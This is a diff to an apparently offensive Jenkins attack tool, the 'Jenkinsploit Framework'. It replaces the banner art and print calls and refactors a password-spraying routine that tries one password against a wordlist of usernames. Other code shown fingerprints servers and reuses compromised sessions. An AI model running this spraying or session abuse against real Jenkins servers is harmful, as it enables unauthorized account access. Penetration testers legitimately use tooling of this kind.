@@ -2,44 +2,27 @@
 #
 #############################################################################################
 #
-#                                            ▄
-#                                          ┌▓▓▓
-#                                         ╓▓▓▓▓▓
-#                                        #▓▓▓▓▓▓▓,
-#                                       ▓▓▓▓▓▓▓▓▓▓▄
-#                                     .▓▓▓▓▓██▓▓▓▓▓▄
-#                                    ┌▓▒▓▓▓█  ▀▓▓▓▓▓▓
-#                                   ▄▒▒▒▓▓▀    ▀▓▓▓▓▓▓
-#                                  #▒▒▒▒▓▀      ╙▓▓▓▓▒▓u
-#                                 ▓▒▒▒▒▒╜        └▓▓▓▒▒▒▄
-#                               ┌▓▒▒▒▒▒"           █▓▒▒▒▒▒
-#                              ╓▒▒▒▒▒▓              ▀▒▒▒▒▒▓
-#                             #▒▒▒▒▒▓                ▀▒▒▒▒▒▓
-#                            ▒▒▒▒▒▒▀                  ╙▒▒▒▒▒▒▄
-#                          ┌▓▒▒▒▒▒╜                    ╙▒▒▒▒▒▒▄
-#                         ╒▒▒▒▒▒▒Ö                      └▓▒▒▒▒▒▒
-#                        #▒▒▒▒▒▒.                         ▓▒▒▒▒▒▓
-#                       ▒▒▒▒▒▒▓                            ▀▒▒▒▒▒▓,
-#                     .▓▒▒▒▒▒▀                              ▀▒▒▒▒▒▒▄
-#                    ┌▓▒▒▒▒▒╜                                ╙▒▒▒▒▒▒N
-#                   ╔▒▒▒▒▒▒╜                                  ╙▒▒▒▒▒▒▓
-#                  #▒▒▒▒▒▒Ö                                    └▓▒▒▒▒▒▓
-#                 ▒▒▒▒▒▒▒   mmmmmmmmmmmmm╖.    ╒mmmm╗╗╗╗╗╗╗╗╗╗   ▓▒▒▒▒▒▒,
-#               ┌▓▒▒▒▒▒▓  .Ñ▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▓   ╞▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓⌐  ▀▒▒▒▒▒▒▄
-#              ╓▒▒▒▒▒▒▀                  ▒▒▒▓                      ╙▒▒▒▒▒▒▒
-#             #▒▒▒▒▒▒Ñ   ƒ##R            ║▒▒▒  [▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ╙▒▒▒▒▒▒▓
-#            ▒▒▒▒▒▒▒╙   #▒▒▓             ║▒▒▒  └╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙º   └▒▒▒▒▒▒▓
-#          .▓▒▒▒▒▒▒"   #▒▒▓             ╓▓▒▒▓                          ▓▒▒▒▒▒▒p
-#         ╓▒▒▒▒▒▒▓    ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╜   ╞▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓    ▓▒▒▒▒▒▒▄
-#        #▒▒▒▒▒▒▓     """"""""""""""""""└       ""└└└└└└└└└└└└└└└"""└    ▀▒▒▒▒▒▒▒
-#       #▒▒▒▒▒▒▒##########################################################▒▒▒▒▒▒▒▓
-#     .▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓,
-#     ╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙
-#                 [ The Jenkinsploit Framework ]-[ @k0fin ]-[ 2021-2022 ]
+# ooooo   ooooo                     oooo
+# `888'   `888'                     `888
+#  888     888   .oooo.    .ooooo.   888  oooo
+#  888ooooo888  `P  )88b  d88' `"Y8  888 .8P'
+#  888     888   .oP"888  888        888888.
+#  888     888  d8(  888  888   .o8  888 `88b.
+# o888o   o888o `Y888""8o `Y8bod8P' o888o o888o
+
+#    oooooooooooo              o8o  oooo
+#    `888'     `8              `"'  `888
+#     888         oooo    ooo oooo   888
+#     888oooo8     `88.  .8'  `888   888
+#     888    "      `88..8'    888   888
+#     888       o    `888'     888   888
+#    o888ooooood8     `8'     o888o o888o O
 #
+## ~ [ The Jenkinsploit Framework ]-[ @k0fin ]-[ 2021-2022 ]
+##
 ## ~ usage: jenkinsploit -h
 ## ~ NOTE: Methods not declared within a class need to be updated!
-##
+#
 #############################################################################################
 
 import sys
@@ -176,7 +159,7 @@ class JenkinsConnect:
             return self.s
 
         else:
-            print("[-] Session cookie is invalid or the compromised user's session has ended.")
+            ColorOut(" Session cookie is invalid or the compromised user's session has ended.", char='[-]').red()
             return self.s
 
     def login(self, user, passwd):
@@ -210,7 +193,7 @@ class JenkinsConnect:
             ColorOut(" Successfully authenticated to target Jenkins instance as {}".format(user), char='[+]').green()
             return self.s
 
-        print("[-] Authentication failed.")
+        ColorOut(' Authentication failed.', char='[-]').red()
         return self.s
 
 def jenkins_convert_req(raw_request):
@@ -510,7 +493,7 @@ class JenkinsploitSessionHandler:
         hudson_version = fingerprint_req.headers['X-Hudson']
         web_server_version = fingerprint_req.headers['Server']
         ssh_endpoint = fingerprint_req.headers['X-SSH-Endpoint']
-        instance_pub_key = fingerprint_req.headers['X-Public-Key']
+        instance_pub_key = fingerprint_req.headers['X-Instance-Identity']
 
         print('''_____________________________
 Jenkins:      {}
@@ -741,22 +724,21 @@ _____________________________\n'''.format(jenkins_version,hudson_version,web_ser
 
 class JenkinsploitSpray:
 
-    def __init__(self, h, p, userlist='/usr/share/wordlists/jenkinsploit-default-usernames.lst', passwd='normal'):
+    def __init__(self, h, p, userlist='/usr/share/wordlists/jenkinsploit-default-usernames.lst'):
         self.h = h
         self.p = p
         self.url = 'http://{}:{}'.format(self.h,self.p)
         self.userlist = userlist
-        self.passwd = passwd
 
-    def runPasswordSpray(self):
+    def runPasswordSpray(self, passwd="normal"):
 
         with open(self.userlist, "r") as username_file:
             usernames_list = username_file.read().strip().rsplit("\n")
 
             for username in usernames_list:
                 spray_connection = JenkinsConnect(self.url)
-                print('[*] Attempting authentication with: {}:{}'.format(username, self.passwd))
-                print(spray_connection.login(username, self.passwd))
+                ColorOut(' Attempting authentication with: {}:{}'.format(username, passwd), char='[*]').blue()
+                spray_connection.login(username, passwd)
 
 def main():
     '''Jenkinsploit main()'''
@@ -827,7 +809,11 @@ def main():
         ColorOut(' Connected to Jenkins instance.', char='[*]').blue()
 
         if args["password_spray"]:
-            password_spray = JenkinsploitSpray(args["host"], args["port"]).runPasswordSpray()
+            if args["passwd"]:
+                password_spray = JenkinsploitSpray(args["host"], args["port"]).runPasswordSpray(passwd=args["passwd"])
+
+            else:
+                password_spray = JenkinsploitSpray(args["host"], args["port"]).runPasswordSpray()
 
         if args["username"] and args["passwd"]:
             ColorOut(' Authenticating to Jenkins instance with provided credentials for Jenkins user ( {} )...'.format(args["username"]), char='[*]').blue()
